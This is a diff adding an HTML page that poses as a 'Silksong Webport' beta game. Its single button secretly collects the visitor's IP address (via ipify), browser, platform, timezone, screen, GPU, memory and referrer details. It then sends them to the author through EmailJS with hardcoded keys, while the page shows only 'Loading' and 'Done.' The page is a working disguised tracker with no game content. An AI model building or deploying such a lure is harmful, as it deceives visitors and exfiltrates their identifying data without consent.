@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Silksong Webport</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #0a1a2f;
+        font-family: "Inter", sans-serif;
+        color: #e6ecf5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        overflow: hidden;
+    }
+
+    .container {
+        background: rgba(255, 255, 255, 0.05);
+        padding: 40px;
+        border-radius: 16px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 0 40px rgba(0, 150, 255, 0.2);
+        text-align: center;
+        width: 90%;
+        max-width: 420px;
+        animation: fadeIn 0.8s ease;
+    }
+
+    h1 {
+        margin-top: 0;
+        font-size: 28px;
+        font-weight: 600;
+        color: #9cc9ff;
+    }
+
+    button {
+        margin-top: 20px;
+        padding: 14px 32px;
+        font-size: 18px;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        background: linear-gradient(135deg, #1e90ff, #0066cc);
+        color: white;
+        font-weight: 600;
+        transition: 0.25s ease;
+        box-shadow: 0 0 12px rgba(30, 144, 255, 0.4);
+    }
+
+    button:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 0 20px rgba(30, 144, 255, 0.7);
+    }
+
+    #status {
+        margin-top: 20px;
+        font-size: 16px;
+        color: #b7d7ff;
+        white-space: pre-wrap;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>Silksong Webport</h1>
+    <p>This is a beta test and this will work when it works</p>
+    <button id="send">Open V1</button>
+    <pre id="status"></pre>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+emailjs.init("szNOim0teOSneaUEb");
+
+async function collectInfo() {
+    const ip = await fetch("https://api.ipify.org?format=json")
+        .then(r => r.json())
+        .then(d => d.ip)
+        .catch(() => "Unavailable");
+
+    const gl = document.createElement("canvas").getContext("webgl");
+    const debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;
+    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
+
+    return {
+        ip,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        deviceMemory: navigator.deviceMemory || "Unknown",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+        cookiesEnabled: navigator.cookieEnabled,
+        referrer: document.referrer || "None",
+        gpu,
+        touchSupport: navigator.maxTouchPoints > 0,
+        vendor: navigator.vendor,
+    };
+}
+
+document.getElementById("send").onclick = async () => {
+    const status = document.getElementById("status");
+    status.textContent = "Loading";
+
+    const info = await collectInfo();
+
+    emailjs.send("service_iproogf", "template_8bq4d8i", info)
+        .then(() => {
+            status.textContent = "Done.";
+        })
+        .catch(err => {
+            status.textContent = "Error: " + err;
+        });
+};
+</script>
+
+</body>
+</html>
